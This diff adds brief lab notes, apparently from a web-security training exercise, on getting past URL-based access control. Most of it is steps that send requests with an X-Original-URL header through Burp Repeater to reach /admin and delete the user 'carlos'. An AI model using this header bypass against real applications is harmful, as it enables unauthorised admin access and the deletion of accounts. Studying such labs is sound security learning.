@@ -1,0 +1,24 @@
+Url based access control can be circumvented
+Goal: Access the admin panel and delete the Carlose User
+
+
+1)
+-Send Get to Repeater
+-Change Get /admin to /
+-X-Original-Url: /doesnotexist
+-Send
+-Get 404, which means app supports this header
+
+2)
+-Send Get to Repeater
+-Change Get /admin to /
+-X-Original-Url: /admin
+-Send
+-Access to Page now
+-Response contains, /admin/delete?username=carlos
+
+3)
+-Change Get /admin to /?username=carlos
+-X-Original-URL: /admin/delete
+-Send
+-Carlos deleted
